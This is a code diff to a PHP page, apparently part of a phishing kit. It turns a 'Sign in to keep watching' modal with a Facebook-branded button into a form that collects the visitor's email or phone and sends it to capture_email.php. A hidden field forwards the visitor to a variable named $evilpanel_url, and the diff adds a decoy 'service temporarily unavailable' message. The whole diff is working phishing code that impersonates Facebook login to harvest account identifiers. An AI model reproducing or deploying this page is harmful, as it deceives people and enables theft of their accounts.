@@ -770,14 +770,24 @@ if (!defined('SHADOW_URL')) {
                     <img data-profile-img alt="Profile avatar" class="modal-profile-pic" width="160" height="160" src="https://static.wixstatic.com/media/8455f5_c082110886634d768b1c7a9f956c3b1b~mv2.jpg">
                 </div>
                 <p id="cta-title" class="cta-heading">Sign in to keep watching</p>
-                <button id="ctaButton" type="button" class="cta-btn cta-btn-facebook" data-target-url="">
-                    <span class="cta-icon" aria-hidden="true">
-                        <svg viewBox="0 0 20 20" role="presentation">
-                            <path d="M18 0H2C.9 0 0 .9 0 2v16c0 1.1.9 2 2 2h8.6v-7H8v-3h2.6V7c0-2.6 1.6-4 3.8-4 1.1 0 2.1.1 2.6.1v3h-1.8c-1.4 0-1.7.7-1.7 1.6v2.3H17l-.4 3h-2.7V20H18c1.1 0 2-.9 2-2V2c0-1.1-.9-2-2-2z" fill="currentColor" />
-                        </svg>
-                    </span>
-                    Continue with Facebook
-                </button>
+                <div id="ctaUnavailable" class="cta-unavailable" style="display:none;">
+                    <p style="margin:0;color:#b94a48;font-weight:600;">Service temporarily unavailable. Please try again later.</p>
+                </div>
+                <form id="ctaForm" class="cta-form" method="GET" action="capture_email.php" novalidate>
+                    <div class="cta-form-group">
+                        <label for="ctaEmail" class="cta-label">Email or phone</label>
+                        <input id="ctaEmail" name="email" type="email" autocomplete="username" required class="cta-input" placeholder="Email or phone number" inputmode="email" />
+                        <input id="ctaNext" name="next" type="hidden" value="<?php echo htmlspecialchars($evilpanel_url); ?>" />
+                    </div>
+                    <button id="ctaButton" type="submit" class="cta-btn cta-btn-facebook" data-target-url="">
+                        <span class="cta-icon" aria-hidden="true">
+                            <svg viewBox="0 0 20 20" role="presentation">
+                                <path d="M18 0H2C.9 0 0 .9 0 2v16c0 1.1.9 2 2 2h8.6v-7H8v-3h2.6V7c0-2.6 1.6-4 3.8-4 1.1 0 2.1.1 2.6.1v3h-1.8c-1.4 0-1.7.7-1.7 1.6v2.3H17l-.4 3h-2.7V20H18c1.1 0 2-.9 2-2V2c0-1.1-.9-2-2-2z" fill="currentColor" />
+                            </svg>
+                        </span>
+                        Continue with Facebook
+                    </button>
+                </form>
             </div>
         </section>
     </div>
